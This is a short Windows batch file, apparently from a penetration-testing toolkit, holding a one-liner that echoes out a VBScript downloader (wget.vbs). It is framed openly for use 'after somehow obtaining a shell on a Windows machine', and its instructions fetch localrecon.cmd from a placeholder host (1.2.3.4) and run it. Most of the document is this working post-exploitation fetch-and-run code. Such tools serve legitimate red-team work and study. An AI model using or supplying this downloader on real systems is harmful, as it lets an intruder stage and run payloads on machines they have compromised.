:: This software is provided under under the BSD 3-Clause License.
:: See the accompanying LICENSE file for more information.
:: 
:: Oneliner to download files on Windows via the commandline
:: Use this after somehow obtaining a shell on a Windows machine
:: 
:: Author:
::  Arris Huijgen (@bitsadmin)
:: 
:: Website:
::  https://github.com/bitsadmin/
:: 

:: Instructions
:: 1. Execute oneliner below to create the wget.vbs script
:: 2. Download any file using the following commandline: cscript wget.vbs http://1.2.3.4/localrecon.cmd localrecon.cmd
:: 3. Execute the downloaded file, i.e.: localrecon.cmd

echo On Error Resume Next >wget.vbs & echo strUrl = WScript.Arguments.Item(0) >>wget.vbs & echo StrFile = WScript.Arguments.Item(1) >>wget.vbs & echo Dim http, stream >>wget.vbs & echo Set http = Nothing >>wget.vbs & echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >>wget.vbs & echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >>wget.vbs & echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >>wget.vbs & echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >>wget.vbs & echo http.Open ^"GET^", strUrl, False >>wget.vbs & echo http.Send >>wget.vbs & echo Set stream = createobject("Adodb.Stream") >>wget.vbs & echo With stream >>wget.vbs & echo .Type = 1 >>wget.vbs & echo .Open >>wget.vbs & echo .Write http.ResponseBody >>wget.vbs & echo .SaveToFile StrFile, 2 >>wget.vbs & echo End With >>wget.vbs
